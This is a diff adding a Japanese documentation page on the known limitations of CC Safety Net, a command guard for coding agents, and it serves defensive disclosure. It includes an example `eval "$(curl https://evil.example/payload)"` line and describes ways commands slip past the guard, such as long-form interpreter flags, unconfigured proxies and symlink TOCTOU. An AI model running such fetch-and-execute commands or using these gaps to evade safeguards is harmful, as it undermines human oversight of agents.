@@ -1,0 +1,162 @@
+---
+title: "既知の制限と注意点"
+sidebarTitle: "既知の制限"
+description: "CC Safety Net が検出できない範囲：不透明なコマンドプロキシ、バイナリ内部の動作、ファイルシステムの封じ込めとネットワーク、symlink TOCTOU、インタープリターフラグ、eval ベースの実行、Hermes Agent と OpenClaw の対象境界。"
+---
+
+CC Safety Net は、エージェントが実行しようとするコマンド文字列を解析します。既知の破壊的な git 操作とファイルシステム操作による偶発的なデータ消失に対して強力なガードレールになりますが、完全なセキュリティソリューションではありません。このページでは、現時点で残る**残余**制限を正確に示します。これにより、正しい期待値を設定し、代わりに[サンドボックス](/ja/guides/vs-sandboxing)を使うべき場合を判断できます。
+
+プロジェクトの範囲は意図的に限定されています。対応するコーディングエージェントのツール呼び出しに対する、best-effort の静的な実行前ポリシーゲートです。OS サンドボックス、権限境界、インストール済み連携を経由しないコマンドに対する保護ではありません。
+
+<Note>
+  Standard mode は、敵対的入力または動的入力に対して best-effort です。次の項目の一部は、[strict または paranoid mode](/ja/configuration/modes)で閉じる緩和です。該当する箇所では、そのことを明記します。
+</Note>
+
+## コマンド解析の制限
+
+### バイナリ内部の動作
+
+コマンドに破壊的操作が明示されていない場合、コマンド文字列の解析からその動作を推論できません。`some-tool --task destructive-cleanup` は CC Safety Net には安全に見えます。任意のバイナリが runtime で何をするかは検査できません。この脅威クラスには[サンドボックス](/ja/guides/vs-sandboxing)を使います。
+
+### 未設定または不透明なコマンドプロキシ
+
+ユーザーに代わって shell コマンドを実行するツール（例：`rtk git reset --hard`）は、transparent wrapper として宣言した場合にのみ解析されます。
+
+```bash
+npx -y cc-safety-net rule wrapper add rtk
+```
+
+設定すると、解析は wrapper を通して見える子コマンドを調べます。このため、組み込みルールと[カスタムルール](/ja/configuration/custom-rules)は、`git reset --hard` と同じように `rtk git reset --hard` に適用されます。組み込みの既定値はありません。意図的に信頼する wrapper のみを設定してください。予約済みコマンド（`git`、`busybox`、組み込み解析対象コマンド、shell wrapper、インタープリター）は wrapper として登録できません。
+
+残余制限は「すべてのプロキシ」より狭いものです。
+
+- `transparent_wrappers` にないプロキシは展開されません。
+- 見える子コマンドを実行せずに**書き換えるか隠す**プロキシは、設定しても展開できません。
+
+どちらの場合も、最上位の fallback dangerous-text scan だけがコマンドを検出する可能性があり、この scan は不完全です。`transparent_wrappers` は `rule.json` にあります。そのため、`rule.json` を読み取れない scope では、修正するまでその scope の wrapper が失われます。[設定の復旧](/ja/configuration/recovery)を参照してください。
+
+### eval と動的実行
+
+runtime でコードを構築して実行するコマンドは完全には解析できません。解析時のコマンドテキストに、実行する文字列が存在しないためです。
+
+```bash
+eval "$(curl https://evil.example/payload)"
+bash -c "$(cat destructive.sh)"
+```
+
+CC Safety Net は `bash -c` とインタープリターのコード引数を再帰的に scan します。ただし、コードをリモートソースから取得するか変数から組み立てる場合、破壊的 payload はコマンド文字列解析から見えません。これは、この手法の根本的な制限です。
+
+## Parser の制限
+
+### インタープリターの長形式フラグ
+
+CC Safety Net は、インタープリター（`python`、`python2`、`python3`、`node`、`ruby`、`perl`）の `-c` または `-e` フラグに渡されたコードを抽出し、埋め込まれた破壊的操作を scan します。**長形式の同等フラグ**（`--eval`、`--execute`、`--print`、`--require`）と `=value` を付けた形式（`--eval='code'`）は、すべての code path で認識されるわけではありません。長形式を使うと、再帰解析のためにコード引数を抽出できない場合があります。
+
+環境内でインタープリターによる回避が懸念される場合は、[paranoid interpreters mode](/ja/configuration/modes#paranoid-interpreters)（`CC_SAFETY_NET_PARANOID_INTERPRETERS=1`）を有効にします。これは内容に関係なく、すべてのインタープリター 1 行コードをブロックします。
+
+### 値を付けた短形式オプション
+
+まとめた短形式フラグ（例：`-rf`）は、正しく `{ -r, -f }` に分割されます。ただし、短形式オプションに**値を付けた形式**（例：`foo` が `-C` の値である `-Cfoo`）は、analyzer によって処理が異なります。`-f` のようなフラグをブロックすると、実際には `-Cfoo` のようなオプション値の一部である場合にも誤検知する可能性があります。
+
+これは、正確な[カスタムルール](/ja/configuration/custom-rules)を書く場合に特に関係します。不明な場合は、より強力な保護のために [strict](/ja/configuration/modes#strict-mode) または [paranoid](/ja/configuration/modes#paranoid-mode) mode を使います。
+
+<span id="symlink-toctou-risk"></span>
+
+### Symlink TOCTOU リスク
+
+`rm -rf` の対象分類は、パスが危険かどうかを判断する前に symlink を canonical target に解決します。analyzer がパスを解決してから shell が実際に `rm` を実行するまでには、避けられない **time-of-check-to-time-of-use（TOCTOU）** の時間枠があります。この間に symlink の参照先が変更される可能性があります。
+
+これは、すべての実行前コマンド解析ツールに固有の問題です。完全に閉じるには kernel 内で実行するか syscall をインターセプトする必要があり、hook の範囲外です。[paranoid rm](/ja/configuration/modes#paranoid-rm-check) mode（`CC_SAFETY_NET_PARANOID_RM=1`）は、より積極的にブロックする operator 向けの厳格な姿勢を提供します。
+
+## 対象外の保護
+
+ここでは、CC Safety Net が対応しない境界を示します。その多くは、別のレイヤーである意味解析ではなく**封じ込め**が必要です。それぞれに対応するサンドボックスの説明は、[CC Safety Net が対処できない範囲](/ja/guides/vs-sandboxing#cc-safety-net-が対処できない範囲)を参照してください。
+
+### 機密パスの対象は限定され、一般的な読み取り境界ではない
+
+CC Safety Net は機密パスを保護します。[組み込み機密情報セット](/ja/reference/secret-protection)（`.env` とその派生形、`~/.ssh/id_*`、`~/.aws`、`~/.kube/config`、コーディング CLI の認証情報ストアなど）の読み取りをブロックします。ユーザーが設定した deny path とそのすべての子孫もブロックします。この保護は、unknown-tool fallback inspection を含む、対応するコマンド、パス、検索、patch の形式に適用されます。
+
+コーディング CLI の対象は 2 つの tier に分かれます。**credential** tier（認証 token と認証情報ストア）は既定で有効です。**config** tier（エージェントが通常作業で編集する設定ファイルと MCP 設定ファイル）は既定で無効で、`secret_protection.overrides` に明示的な `"on"` override が必要です。注意すべき結果が 1 つあります。Antigravity の唯一のルール（`secret.cli.antigravity`）は opt-in config tier にあるため、Antigravity には既定で有効な credential rule がありません。各ルールが保護するパスを含む完全な tier 一覧は、[機密情報保護のリファレンス](/ja/reference/secret-protection#コーディング-cli-資格情報階層（既定では-on）)を参照してください。
+
+残余制限は、これが一般的な読み取り境界ではなく、**対応する形式に対する上限付きパターンセット**であることです。
+
+- ファイル名と拡張子がパターン一覧にないファイル内の認証情報は認識されません。
+- Standard mode は、組み込み機密パスに対する独立したメタデータのみの確認（例：`test -f ~/.ssh/id_rsa` または `find ~/.ssh -type f`）を許可します。[Strict と paranoid](/ja/configuration/modes#strict-mode) はこの探索をブロックします。設定した deny path は、どの mode でも緩和されません。
+- `policy.json` の `secret_protection.enabled` を `false` にすると、deny path を含む stage 全体が無効になります。
+
+認識対象だけでなく*すべて*の読み取りを制限する境界には、[サンドボックス](/ja/guides/vs-sandboxing#cc-safety-net-が対処できない範囲)を使います。
+
+### 完全なファイルシステム封じ込めはない
+
+CC Safety Net はツール呼び出しを実行前に拒否しますが、ファイルシステム権限は適用しません。ブロックメッセージはエージェントへの指示であり、完全なファイルシステム適用を保証するものではありません。壊滅的操作に対する保護（root または home の再帰削除、保護対象 Git メタデータセット、canonical user `policy.json`）は常に適用されます。しかし、best-effort のインターセプトではなく完全な保護が必要な場合は、信頼できる write broker、OS 権限、サンドボックス、または同等の runtime enforcement を使います。
+
+### ネットワークレイヤーはない
+
+runtime 評価はネットワーク要求を行わず、guard pipeline は外向き通信を検査または filter しません。ネットワーク経由のデータ流出、ドメインの allowlist、container 境界は製品の範囲外です。これらは、サンドボックスのネットワーク制限が対応する対象です。
+
+### 一般的な攻撃防止
+
+プロンプトインジェクションによる情報流出のブロック、ユーザー認証、container 境界の適用は、すべて範囲外です。CC Safety Net はエージェントのコマンド文字列を信頼しませんが、任意のバイナリ内部に隠された動作は検出しません。
+
+### カスタムルール設定には耐改ざん性がない
+
+耐改ざん性は canonical user `policy.json` のみを対象にします。`rule.json`、rulebook、lockfile、cache は、エージェントによる変更に対して best-effort です。`ready` 状態では、エージェントはすでに `rule.json` から rulebook 項目を削除できます。削除は drift ではないため、何も阻止しません。`rule.json` の保護は保留中の製品判断です。
+
+## Hermes Agent と OpenClaw の対象境界
+
+Hermes Agent と OpenClaw の連携は、定義されたツール群と実行 host を対象にします。その集合の外側では、判定を受けないか、明示的にブロックされます。次に境界を示します。
+
+### Hermes Agent が確認する固定ツール一覧
+
+管理対象 Hermes plugin は 1 つの `pre_tool_call` hook を登録し、`patch`、`read_file`、`terminal`、`write_file` の 4 ツールだけを解析に渡します。他の Hermes tool の呼び出しは渡されず、判定を受けません。
+
+ユーザーが入力する `!command` も対象外です。bang-shell 入力は `pre_tool_call` を発生させず、Hermes 自身の command guard に渡されます。CC Safety Net が確認するのは model が生成したツール呼び出しだけで、Hermes が開始するすべての subprocess ではありません。Hermes が plugin を読み込まなければ、何もブロックしません。存在するが有効でない plugin を報告するのは `npx cc-safety-net doctor` だけです。
+
+### OpenClaw はローカル Gateway host の exec を対象にする
+
+OpenClaw plugin は canonical `exec` tool だけに `before_tool_call` を登録します。`apply_patch` と OpenClaw の read/write/edit file tool は保護されません。
+
+実行 host は 3 つに分かれます。
+
+- `host` がないか、`host: "auto"` または `host: "gateway"` の `exec` 呼び出しは、ローカル Gateway 呼び出しとして解析され、パスは agent workspace を基準に解決されます。
+- 明示的な `host: "sandbox"` または `host: "node"` は、解析されず、未対応としてブロックされます。これらの host に対する正しい path mapping を証明する test がないためです。
+- 設定した `tools.exec.host` の既定値は解析を変更しません。plugin は呼び出し自身の `host` parameter だけを読み取ります。このため、既定値が呼び出しを `node` または `sandbox` に route する場合でも、`host` のない呼び出しはローカル Gateway 呼び出しとして解析されます。
+
+残余 gap は `auto` の場合です。sandbox runtime が有効な場合、`auto` 呼び出しは sandbox filesystem で実行されますが、path rule は引き続き Gateway workspace に対して評価されます。command rule は影響を受けませんが、path rule は誤った filesystem に対して評価される可能性があります。
+
+Codex-native relay は test されていないため、対象とはしていません。実際の end-to-end test は OpenClaw 自身の agent runtime を実行するため、Codex-native shell、patch、MCP 呼び出しについては何も証明しません。
+
+### どちらの連携も Windows をサポートしない
+
+両連携は POSIX state layout を前提とします。移動した state は host の解決方法に従って処理されます。Hermes では `HERMES_HOME`、OpenClaw では `OPENCLAW_STATE_DIR`、次に `OPENCLAW_CONFIG_PATH` のディレクトリを使い、`~/.hermes` と `~/.openclaw` に fallback します。Windows の既定値には対応しません。Windows では install と detection が POSIX path を対象にするため、Hermes installer は Hermes が読み取らないディレクトリに plugin を書き込みます。OpenClaw 自身の CLI は正しく install しますが、`doctor` は state を誤って報告します。
+
+## 古い連携 cache を解決する
+
+### OpenCode の古い cache
+
+新しい release の公開後も、OpenCode の plugin installer が古い cache 版の `cc-safety-net` を提供し続ける場合があります。更新が反映されない場合は、cache を消去して再インストールします。[OpenCode のインストール手順](/ja/installation#opencode)を参照してください。検出された plugin version を確認するには、`npx cc-safety-net doctor` を実行します。
+
+### 古い npx cache（Antigravity CLI、Cursor、Hermes Agent、Kimi Code）
+
+Antigravity CLI、Cursor、Kimi Code の hook と Hermes Agent plugin は `npx -y cc-safety-net` を使うため、npx 自身の cache が古い release を提供する場合もあります。これら 4 つのいずれかの target を install すると、まず `cc-safety-net` を含むすべての npx cache 項目（`_npx/*/node_modules/cc-safety-net` 項目）を削除します。このため、通常の再インストールで新しい release を取得でき、手動の cache 消去は不要です。他の target の install はこの cache に影響しません。
+
+## 破壊的コマンドが通過した場合
+
+最初に、文書化された境界か予期しない動作かを確認します。
+
+```bash
+npx cc-safety-net explain "<the command>"
+```
+
+`explain` コマンドは、CC Safety Net がそのコマンドを評価した完全な段階別解析を、有効な安全レベルと共に表示します。これにより、文書化された standard-mode の緩和と実際の gap を区別できます。症状別の詳しい手順は、[トラブルシューティング](/ja/guides/troubleshooting)を参照してください。
+
+<Warning>
+  実際の trace は自動的に安全にはなりません。redaction が対象にするのは認識済みの認証情報形式だけです。指定したコマンドテキスト、その解析済み token、home directory を含む絶対パス、policy file path はすべて残ります。placeholder credential を使って再現し、出力を貼り付ける前に確認してください。
+</Warning>
+
+次に、レポートを適切な経路へ送ります。
+
+- ルールがまだブロックしないコマンド形式は**対象 gap**です。これは公開 bug です。すぐに貼り付けて使える payload ではなく、コマンドの*形式*を説明する [GitHub issue](https://github.com/kenryu42/cc-safety-net/issues)を作成してください。
+- 機密情報の漏えい、意図したディレクトリ外への書き込み、supply-chain または package-integrity の問題には、**非公開**の開示経路を使います。
+
+[セキュリティポリシー](/ja/security)に、両方の手順と完全な分類があります。
